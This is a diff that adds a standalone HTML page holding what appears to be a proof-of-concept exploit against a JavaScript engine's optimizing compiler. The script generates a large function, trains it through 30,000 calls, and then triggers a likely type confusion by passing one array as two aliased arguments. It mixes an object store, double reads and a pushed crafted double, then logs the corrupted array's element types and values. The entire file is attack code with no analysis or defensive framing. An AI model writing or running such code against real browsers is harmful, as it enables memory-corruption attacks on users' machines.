@@ -1,0 +1,30 @@
+<!doctype html>
+<meta charset="utf-8">
+<script>
+const N = 650;
+const OPS = 430;
+const lines = ['function trigger(x, arr, alias, obj, idx, limit) {'];
+for (let i = 0; i < N; i++) lines.push(`if (x === ${i}) return ${i};`);
+lines.push('arr[0] = obj;', 'let pre = alias[0] + 0.0;',
+           'let i = 0, result = pre;', 'while (i < limit) {');
+for (let i = 0; i < OPS; i++) lines.push(`result = (result + ${i}) | 0;`);
+lines.push('result = alias[idx] + 0.0;',
+           'Array.prototype.push.call(alias, 4.950618252845e-311);',
+           'i++;', '}', 'return result;', '}', 'return trigger;');
+const trigger = new Function(lines.join('\n'))();
+
+const obj = { marker: 0x1337 };
+function dbl() { return [1.1, 2.2, 3.3]; }
+for (let i = 0; i < 30_000; i++) {
+  trigger(1000, dbl(), dbl(), obj, 0, 1);
+}
+setTimeout(() => {
+  const victim = dbl();
+  try {
+    const result = trigger(1000, victim, victim, obj, 0, 1);
+    console.log('result', typeof result, result);
+    for (let i = 0; i < 7; i++) console.log('victim' + i, typeof victim[i], victim[i]);
+    console.log('length', victim.length);
+  } catch (e) { console.log('caught', e && e.name, e && e.message); }
+}, 3000);
+</script>
